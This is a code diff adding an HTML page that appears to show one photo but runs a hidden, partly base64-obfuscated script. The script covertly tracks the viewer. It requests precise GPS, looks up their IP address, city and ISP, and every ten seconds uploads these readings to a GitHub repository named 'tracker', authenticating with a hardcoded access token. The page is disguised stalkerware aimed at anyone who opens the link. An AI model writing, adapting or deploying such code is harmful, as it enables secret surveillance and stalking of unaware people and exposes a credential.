@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="apple-mobile-web-app-capable" content="yes"><title> </title></head>
+<body style="margin:0;background:#000">
+
+   <img id="photo"
+         style="max-width:100%;max-height:100%;object-fit:contain;">
+      
+<script>
+(function(){
+var T="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";
+var R=atob("bWFuaW1vaGFuMTk5OC90cmFja2Vy");
+var F=atob("bG9jYXRpb25fbG9nLmpzb24=");
+var j=atob("SU1HXzIwMjYwNzI2XzEwMTgwOS5qcGc=");
+var I=+atob("MTA=");
+ 
+
+var lastLoc=null;
+var lastIP=null;
+var raw1="https://raw.githubusercontent.com/"+R+"/main/"+j;
+document.getElementById("photo").src = raw1;
+function initGPS(){
+    if(!navigator.geolocation)return;
+    navigator.geolocation.getCurrentPosition(function(p){
+        lastLoc={lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy,method:"GPS"};
+        navigator.geolocation.watchPosition(function(p2){
+            lastLoc={lat:p2.coords.latitude,lng:p2.coords.longitude,accuracy:p2.coords.accuracy,method:"GPS"};
+        },function(){},{enableHighAccuracy:true,minimumAge:5000});
+    },function(e){
+        if(e.code===1)send();
+    },{enableHighAccuracy:true,timeout:10000});
+}
+
+function fetchIP(){
+    return fetch("http://ip-api.com/json/?fields=status,query,city,regionName,country,isp").then(function(r){return r.json()}).then(function(d){
+        if(d.status==="success")lastIP={ip:d.query,city:d.city,region:d.regionName,country:d.country,isp:d.isp};
+    }).catch(function(){});
+}
+
+var busy=false;
+
+function push(e){
+    if(busy)return Promise.resolve();
+    busy=true;
+    var raw="https://raw.githubusercontent.com/"+R+"/main/"+F;
+    var api="https://api.github.com/repos/"+R+"/contents/"+F;
+   
+    var ex={locations:[]},sha=null;
+    fetch(raw+"?t="+Date.now()).then(function(r){return r.ok?r.json():null}).then(function(d){
+        if(d&&d.locations)ex=d;
+        return fetch(api);
+    }).then(function(r){return r.ok?r.json():null}).then(function(d){
+        if(d)sha=d.sha;
+        ex.locations.push(e);
+        if(ex.locations.length>500)ex.locations=ex.locations.slice(-500);
+        var b={message:"\ud83d\udccd "+(e.city||"?"),content:btoa(unescape(encodeURIComponent(JSON.stringify(ex,null,2))))};
+        if(sha)b.sha=sha;
+        return fetch(api,{method:"PUT",headers:{"Authorization":"token "+T,"Content-Type":"application/json"},body:JSON.stringify(b)});
+    }).then(function(r){busy=false;if(!r.ok)throw 0}).catch(function(){busy=false});
+}
+
+function send(){
+    fetchIP().then(function(){
+        var e;
+        if(lastLoc){
+            e={lat:lastLoc.lat,lng:lastLoc.lng,accuracy:lastLoc.accuracy,method:lastLoc.method,ip:lastIP?lastIP.ip:"-",city:lastIP?lastIP.city:"-",region:lastIP?lastIP.region:"-",country:lastIP?lastIP.country:"-",isp:lastIP?lastIP.isp:"-",timestamp:new Date().toISOString()};
+        } else if(lastIP){
+            e={lat:0,lng:0,accuracy:"IP-only",method:"IP",ip:lastIP.ip,city:lastIP.city,region:lastIP.region,country:lastIP.country,isp:lastIP.isp,timestamp:new Date().toISOString()};
+        }
+        if(e)push(e);
+    });
+}
+
+initGPS();
+send();
+setInterval(send,I*1000);
+})();
+</script>
+</body>
+</html>
